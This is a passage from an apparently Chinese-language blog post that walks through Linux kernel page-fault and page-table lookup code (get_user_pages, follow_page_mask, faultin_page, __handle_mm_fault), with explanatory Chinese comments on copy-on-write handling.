class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs c">...<br>retry:<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * If we have a pending SIGKILL, don&#x27;t keep faulting pages and</span><br><span class="hljs-comment"> * potentially allocating memory.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (unlikely(fatal_signal_pending(current))) <span class="hljs-comment">//用以捕获信号</span><br><span class="hljs-keyword">return</span> i ? i : -ERESTARTSYS;<br>cond_resched(); <span class="hljs-comment">//进行进程调度，主动释放权限</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">第一次follow_page_mask，由于没有分配页表因此返回0，即page = 0,进入faultin_page,参数foll_flags的值为0x17，nonblocking值为0</span><br><span class="hljs-comment">进入handle_mm_fault，fault_flags为1</span><br><span class="hljs-comment">进入__handle__mm_fault，此时pte已经分配好，但是还没有与物理页进行映射</span><br><span class="hljs-comment">进入handle_pte_fault，将pte与物理页进行映射</span><br><span class="hljs-comment">进入do_fault函数对pte表进行处理</span><br><span class="hljs-comment">进入do_cow_fault进行写时复制处理</span><br><span class="hljs-comment">进入__do_fault</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br>page = follow_page_mask(vma, start, foll_flags, &amp;page_mask);  <span class="hljs-comment">//获取页</span><br><span class="hljs-keyword">if</span> (!page) &#123;<br><span class="hljs-type">int</span> ret;<br>ret = faultin_page(tsk, vma, start, &amp;foll_flags, <span class="hljs-comment">//页中断处理</span><br>nonblocking);<br><span class="hljs-keyword">switch</span> (ret) &#123;<br><span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br><span class="hljs-keyword">goto</span> retry;<br><span class="hljs-keyword">case</span> -EFAULT:<br><span class="hljs-keyword">case</span> -ENOMEM:<br><span class="hljs-keyword">case</span> -EHWPOISON:<br><span class="hljs-keyword">return</span> i ? i : ret;<br><span class="hljs-keyword">case</span> -EBUSY:<br><span class="hljs-keyword">return</span> i;<br><span class="hljs-keyword">case</span> -ENOENT:<br><span class="hljs-keyword">goto</span> next_page;<br>&#125;<br>BUG();<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (PTR_ERR(page) == -EEXIST) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Proper page table entry exists, but no corresponding</span><br><span class="hljs-comment"> * struct page.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">goto</span> next_page;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (IS_ERR(page)) &#123;<br><span class="hljs-keyword">return</span> i ? i : PTR_ERR(page);<br>&#125;<br><span class="hljs-keyword">if</span> (pages) &#123;<br>pages[i] = page;<br>flush_anon_page(vma, page, start);<br>flush_dcache_page(page);<br>page_mask = <span class="hljs-number">0</span>;<br>&#125;<br>next_page:<br><span class="hljs-keyword">if</span> (vmas) &#123;<br>vmas[i] = vma;<br>page_mask = <span class="hljs-number">0</span>;<br>&#125;<br>page_increm = <span class="hljs-number">1</span> + (~(start &gt;&gt; PAGE_SHIFT) &amp; page_mask);<br><span class="hljs-keyword">if</span> (page_increm &gt; nr_pages)<br>page_increm = nr_pages;<br>i += page_increm;<br>start += page_increm * PAGE_SIZE;<br>nr_pages -= page_increm;<br>&#125; <span class="hljs-keyword">while</span> (nr_pages);<br><span class="hljs-keyword">return</span> i;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="follow-page-mask"><a href="#follow-page-mask" class="headerlink" title="follow_page_mask"></a>follow_page_mask</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> page *<span class="hljs-title function_">follow_page_mask</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> vm_area_struct *vma,</span><br><span class="hljs-params">      <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> address, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags,</span><br><span class="hljs-params">      <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *page_mask)</span><br>&#123; <span class="hljs-comment">//根据虚拟地址查找对应的物理页</span><br>  <span class="hljs-comment">//pgd-&gt;pud-&gt;pmd-&gt;ptl-&gt;pte</span><br><span class="hljs-type">pgd_t</span> *pgd; <br><span class="hljs-type">pud_t</span> *pud;<br><span class="hljs-type">pmd_t</span> *pmd;<br><span class="hljs-type">spinlock_t</span> *ptl;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span> =</span> vma-&gt;vm_mm;<br><br>*page_mask = <span class="hljs-number">0</span>;<br><br>page = follow_huge_addr(mm, address, flags &amp; FOLL_WRITE); <span class="hljs-comment">//判断是否为huag page</span><br><span class="hljs-keyword">if</span> (!IS_ERR(page)) &#123;<br>BUG_ON(flags &amp; FOLL_GET);<br><span class="hljs-keyword">return</span> page;<br>&#125;<br><br>pgd = pgd_offset(mm, address); <span class="hljs-comment">//获取pgd对应的目录项</span><br><span class="hljs-keyword">if</span> (pgd_none(*pgd) || unlikely(pgd_bad(*pgd)))<br><span class="hljs-keyword">return</span> no_page_table(vma, flags);<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">* 011111110 | 110110010 | 1000 0011 1 | 0111 1010 0 | 000000000000</span><br><span class="hljs-comment">* 9 | 9 | 9 | 9 | 12|</span><br><span class="hljs-comment">*/</span><br>pud = pud_offset(pgd, address); <span class="hljs-comment">//获取pud对应的表项</span><br><span class="hljs-keyword">if</span> (pud_none(*pud)) <span class="hljs-comment">//判断pud对应的表项是否为空</span><br><span class="hljs-keyword">return</span> no_page_table(vma, flags);<br><span class="hljs-keyword">if</span> (pud_huge(*pud) &amp;&amp; vma-&gt;vm_flags &amp; VM_HUGETLB) &#123; <span class="hljs-comment">//判断是不是hug的页表</span><br>page = follow_huge_pud(mm, address, pud, flags);<br><span class="hljs-keyword">if</span> (page)<br><span class="hljs-keyword">return</span> page;<br><span class="hljs-keyword">return</span> no_page_table(vma, flags);<br>&#125;<br><span class="hljs-keyword">if</span> (unlikely(pud_bad(*pud)))<br><span class="hljs-keyword">return</span> no_page_table(vma, flags);<br><br>pmd = pmd_offset(pud, address); <span class="hljs-comment">//获取pmd项</span><br><span class="hljs-keyword">if</span> (pmd_none(*pmd))<br><span class="hljs-keyword">return</span> no_page_table(vma, flags);<br><span class="hljs-keyword">if</span> (pmd_huge(*pmd) &amp;&amp; vma-&gt;vm_flags &amp; VM_HUGETLB) &#123;<br>page = follow_huge_pmd(mm, address, pmd, flags);<br><span class="hljs-keyword">if</span> (page)<br><span class="hljs-keyword">return</span> page;<br><span class="hljs-keyword">return</span> no_page_table(vma, flags);<br>&#125;<br><span class="hljs-keyword">if</span> ((flags &amp; FOLL_NUMA) &amp;&amp; pmd_protnone(*pmd))<br><span class="hljs-keyword">return</span> no_page_table(vma, flags);<br><span class="hljs-keyword">if</span> (pmd_trans_huge(*pmd)) &#123; <span class="hljs-comment">//从hugb page中分割物理页</span><br><span class="hljs-keyword">if</span> (flags &amp; FOLL_SPLIT) &#123;<br>split_huge_page_pmd(vma, address, pmd);<br><span class="hljs-keyword">return</span> follow_page_pte(vma, address, pmd, flags);<br>&#125;<br>ptl = pmd_lock(mm, pmd); <span class="hljs-comment">//获取ptl项</span><br><span class="hljs-keyword">if</span> (likely(pmd_trans_huge(*pmd))) &#123;<br><span class="hljs-keyword">if</span> (unlikely(pmd_trans_splitting(*pmd))) &#123;<br>spin_unlock(ptl);<br>wait_split_huge_page(vma-&gt;anon_vma, pmd);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>page = follow_trans_huge_pmd(vma, address,<br>     pmd, flags);<br>spin_unlock(ptl);<br>*page_mask = HPAGE_PMD_NR - <span class="hljs-number">1</span>;<br><span class="hljs-keyword">return</span> page;<br>&#125;<br>&#125; <span class="hljs-keyword">else</span><br>spin_unlock(ptl);<br>&#125;<br><span class="hljs-keyword">return</span> follow_page_pte(vma, address, pmd, flags);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="follow-page-pte"><a href="#follow-page-pte" class="headerlink" title="follow_page_pte"></a>follow_page_pte</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> page *<span class="hljs-title function_">follow_page_pte</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> vm_area_struct *vma,</span><br><span class="hljs-params"><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> address, <span class="hljs-type">pmd_t</span> *pmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span> =</span> vma-&gt;vm_mm;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">spinlock_t</span> *ptl;<br><span class="hljs-type">pte_t</span> *ptep, pte;<br><br>retry:<br><span class="hljs-keyword">if</span> (unlikely(pmd_bad(*pmd))) <span class="hljs-comment">//判断页表是否可以访问等权限</span><br><span class="hljs-keyword">return</span> no_page_table(vma, flags);<br><br>ptep = pte_offset_map_lock(mm, pmd, address, &amp;ptl); <span class="hljs-comment">//取出页框</span><br>pte = *ptep;<br><span class="hljs-keyword">if</span> (!pte_present(pte)) &#123; <span class="hljs-comment">//判断pte内是否为空</span><br><span class="hljs-type">swp_entry_t</span> entry;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * KSM&#x27;s break_ksm() relies upon recognizing a ksm page</span><br><span class="hljs-comment"> * even while it is being migrated, so for that case we</span><br><span class="hljs-comment"> * need migration_entry_wait().</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (likely(!(flags &amp; FOLL_MIGRATION)))<br><span class="hljs-keyword">goto</span> no_page;<br><span class="hljs-keyword">if</span> (pte_none(pte))<br><span class="hljs-keyword">goto</span> no_page;<br>entry = pte_to_swp_entry(pte);<br><span class="hljs-keyword">if</span> (!is_migration_entry(entry))<br><span class="hljs-keyword">goto</span> no_page;<br>pte_unmap_unlock(ptep, ptl);<br>migration_entry_wait(mm, pmd, address);<br><span class="hljs-keyword">goto</span> retry;<br>&#125;<br><span class="hljs-keyword">if</span> ((flags &amp; FOLL_NUMA) &amp;&amp; pte_protnone(pte))<br><span class="hljs-keyword">goto</span> no_page;<br><span class="hljs-keyword">if</span> ((flags &amp; FOLL_WRITE) &amp;&amp; !pte_write(pte)) &#123;<br>pte_unmap_unlock(ptep, ptl);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br>page = vm_normal_page(vma, address, pte); <span class="hljs-comment">//通过address与pte找到物理页</span><br><span class="hljs-keyword">if</span> (unlikely(!page)) &#123;<br><span class="hljs-keyword">if</span> (flags &amp; FOLL_DUMP) &#123;<br><span class="hljs-comment">/* Avoid special (like zero) pages in core dumps */</span><br>page = ERR_PTR(-EFAULT);<br><span class="hljs-keyword">goto</span> out;<br>&#125;<br><br><span class="hljs-keyword">if</span> (is_zero_pfn(pte_pfn(pte))) &#123;<br>page = pte_page(pte);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-type">int</span> ret;<br><br>ret = follow_pfn_pte(vma, address, ptep, flags);<br>page = ERR_PTR(ret);<br><span class="hljs-keyword">goto</span> out;<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (flags &amp; FOLL_GET)<br>get_page_foll(page);<br><span class="hljs-keyword">if</span> (flags &amp; FOLL_TOUCH) &#123;<br><span class="hljs-keyword">if</span> ((flags &amp; FOLL_WRITE) &amp;&amp;<br>    !pte_dirty(pte) &amp;&amp; !PageDirty(page))<br>set_page_dirty(page);<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * pte_mkyoung() would be more correct here, but atomic care</span><br><span class="hljs-comment"> * is needed to avoid losing the dirty bit: it is easier to use</span><br><span class="hljs-comment"> * mark_page_accessed().</span><br><span class="hljs-comment"> */</span><br>mark_page_accessed(page); <span class="hljs-comment">//标记页被访问</span><br>&#125;<br><span class="hljs-keyword">if</span> ((flags &amp; FOLL_MLOCK) &amp;&amp; (vma-&gt;vm_flags &amp; VM_LOCKED)) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * The preliminary mapping check is mainly to avoid the</span><br><span class="hljs-comment"> * pointless overhead of lock_page on the ZERO_PAGE</span><br><span class="hljs-comment"> * which might bounce very badly if there is contention.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * If the page is already locked, we don&#x27;t need to</span><br><span class="hljs-comment"> * handle it now - vmscan will handle it later if and</span><br><span class="hljs-comment"> * when it attempts to reclaim the page.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (page-&gt;mapping &amp;&amp; trylock_page(page)) &#123;<br>lru_add_drain();  <span class="hljs-comment">/* push cached pages to LRU */</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Because we lock page here, and migration is</span><br><span class="hljs-comment"> * blocked by the pte&#x27;s page reference, and we</span><br><span class="hljs-comment"> * know the page is still mapped, we don&#x27;t even</span><br><span class="hljs-comment"> * need to check for file-cache page truncation.</span><br><span class="hljs-comment"> */</span><br>mlock_vma_page(page);<br>unlock_page(page);<br>&#125;<br>&#125;<br>out:<br>pte_unmap_unlock(ptep, ptl);<br><span class="hljs-keyword">return</span> page; <span class="hljs-comment">//将物理页返回</span><br>no_page:<br>pte_unmap_unlock(ptep, ptl);<br><span class="hljs-keyword">if</span> (!pte_none(pte))<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">return</span> no_page_table(vma, flags);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="faultin-page"><a href="#faultin-page" class="headerlink" title="faultin_page"></a>faultin_page</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">faultin_page</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> task_struct *tsk, <span class="hljs-keyword">struct</span> vm_area_struct *vma,</span><br><span class="hljs-params"><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> address, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *flags, <span class="hljs-type">int</span> *nonblocking)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span> =</span> vma-&gt;vm_mm;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> fault_flags = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> ret;<br><br><span class="hljs-comment">/* mlock all present pages, but do not fault in new pages */</span><br><span class="hljs-keyword">if</span> ((*flags &amp; (FOLL_POPULATE | FOLL_MLOCK)) == FOLL_MLOCK)<br><span class="hljs-keyword">return</span> -ENOENT;<br><span class="hljs-comment">/* For mm_populate(), just skip the stack guard page. */</span><br><span class="hljs-keyword">if</span> ((*flags &amp; FOLL_POPULATE) &amp;&amp;<br>(stack_guard_page_start(vma, address) ||<br> stack_guard_page_end(vma, address + PAGE_SIZE)))<br><span class="hljs-keyword">return</span> -ENOENT;<br><span class="hljs-keyword">if</span> (*flags &amp; FOLL_WRITE) <span class="hljs-comment">//判断是否需要写入页</span><br>fault_flags |= FAULT_FLAG_WRITE;<br><span class="hljs-keyword">if</span> (nonblocking)<br>fault_flags |= FAULT_FLAG_ALLOW_RETRY;<br><span class="hljs-keyword">if</span> (*flags &amp; FOLL_NOWAIT)<br>fault_flags |= FAULT_FLAG_ALLOW_RETRY | FAULT_FLAG_RETRY_NOWAIT;<br><span class="hljs-keyword">if</span> (*flags &amp; FOLL_TRIED) &#123;<br>VM_WARN_ON_ONCE(fault_flags &amp; FAULT_FLAG_ALLOW_RETRY);<br>fault_flags |= FAULT_FLAG_TRIED;<br>&#125;<br><br>ret = handle_mm_fault(mm, vma, address, fault_flags);<br><span class="hljs-keyword">if</span> (ret &amp; VM_FAULT_ERROR) &#123;<br><span class="hljs-keyword">if</span> (ret &amp; VM_FAULT_OOM)<br><span class="hljs-keyword">return</span> -ENOMEM;<br><span class="hljs-keyword">if</span> (ret &amp; (VM_FAULT_HWPOISON | VM_FAULT_HWPOISON_LARGE))<br><span class="hljs-keyword">return</span> *flags &amp; FOLL_HWPOISON ? -EHWPOISON : -EFAULT;<br><span class="hljs-keyword">if</span> (ret &amp; (VM_FAULT_SIGBUS | VM_FAULT_SIGSEGV))<br><span class="hljs-keyword">return</span> -EFAULT;<br>BUG();<br>&#125;<br><br><span class="hljs-keyword">if</span> (tsk) &#123;<br><span class="hljs-keyword">if</span> (ret &amp; VM_FAULT_MAJOR)<br>tsk-&gt;maj_flt++;<br><span class="hljs-keyword">else</span><br>tsk-&gt;min_flt++;<br>&#125;<br><br><span class="hljs-keyword">if</span> (ret &amp; VM_FAULT_RETRY) &#123;<br><span class="hljs-keyword">if</span> (nonblocking)<br>*nonblocking = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">return</span> -EBUSY;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * The VM_FAULT_WRITE bit tells us that do_wp_page has broken COW when</span><br><span class="hljs-comment"> * necessary, even if maybe_mkwrite decided not to set pte_write. We</span><br><span class="hljs-comment"> * can thus safely do subsequent page lookups as if they were reads.</span><br><span class="hljs-comment"> * But only do so when looping for pte_write is futile: in some cases</span><br><span class="hljs-comment"> * userspace may also be wanting to write to the gotten user page,</span><br><span class="hljs-comment"> * which a read fault here might prevent (a readonly page might get</span><br><span class="hljs-comment"> * reCOWed by userspace write).</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> ((ret &amp; VM_FAULT_WRITE) &amp;&amp; !(vma-&gt;vm_flags &amp; VM_WRITE))<br>*flags &amp;= ~FOLL_WRITE;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="handle-mm-fault"><a href="#handle-mm-fault" class="headerlink" title="handle_mm_fault"></a>handle_mm_fault</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> __handle_mm_fault(<span class="hljs-keyword">struct</span> mm_struct *mm, <span class="hljs-keyword">struct</span> vm_area_struct *vma,<br>     <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> address, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)<br>&#123;<br><span class="hljs-type">pgd_t</span> *pgd;<br><span class="hljs-type">pud_t</span> *pud;<br><span class="hljs-type">pmd_t</span> *pmd;<br><span class="hljs-type">pte_t</span> *pte;<br><br><span class="hljs-keyword">if</span> (unlikely(is_vm_hugetlb_page(vma)))<br><span class="hljs-keyword">return</span> hugetlb_fault(mm, vma, address, flags);<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">   #define pgd_offset(mm, address)((mm)-&gt;pgd+pgd_index(address))</span><br><span class="hljs-comment">   mm-&gt;pgd即pgd的基地址</span><br><span class="hljs-comment">   address即需要访问的线性地址</span><br><span class="hljs-comment">   #define pgd_index(address)(((address) &gt;&gt; PGDIR_SHIFT) &amp; (PTRS_PER_PGD-1))</span><br><span class="hljs-comment">   #define PGDIR_SHIFT39</span><br><span class="hljs-comment">   #define PAGE_SHIFT12</span><br><span class="hljs-comment">   #define PTRS_PER_PGD 521</span><br><span class="hljs-comment">   经过宏替换后 pdg_index(address) = (((address) &gt;&gt; 39) &amp; 0x1ff )</span><br><span class="hljs-comment">   address的39-48比特为pgd_index,即高12比特</span><br><span class="hljs-comment">*/</span><br>pgd = pgd_offset(mm, address);  <br>pud = pud_alloc(mm, pgd, address);<br><span class="hljs-keyword">if</span> (!pud)<br><span class="hljs-keyword">return</span> VM_FAULT_OOM;<br>pmd = pmd_alloc(mm, pud, address);<br><span class="hljs-keyword">if</span> (!pmd)<br><span class="hljs-keyword">return</span> VM_FAULT_OOM;<br><span class="hljs-keyword">if</span> (pmd_none(*pmd) &amp;&amp; transparent_hugepage_enabled(vma)) &#123;<br><span class="hljs-type">int</span> ret = create_huge_pmd(mm, vma, address, pmd, flags);<br><span class="hljs-keyword">if</span> (!(ret &amp; VM_FAULT_FALLBACK))<br><span class="hljs-keyword">return</span> ret;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-type">pmd_t</span> orig_pmd = *pmd;<br><span class="hljs-type">int</span> ret;<br><br>barrier();<br><span class="hljs-keyword">if</span> (pmd_trans_huge(orig_pmd)) &#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> dirty = flags &amp; FAULT_FLAG_WRITE;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * If the pmd is splitting, return and retry the</span><br><span class="hljs-comment"> * the fault.  Alternative: wait until the split</span><br><span class="hljs-comment"> * is done, and goto retry.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (pmd_trans_splitting(orig_pmd))<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">if</span> (pmd_protnone(orig_pmd))<br><span class="hljs-keyword">return</span> do_huge_pmd_numa_page(mm, vma, address,<br>     orig_pmd, 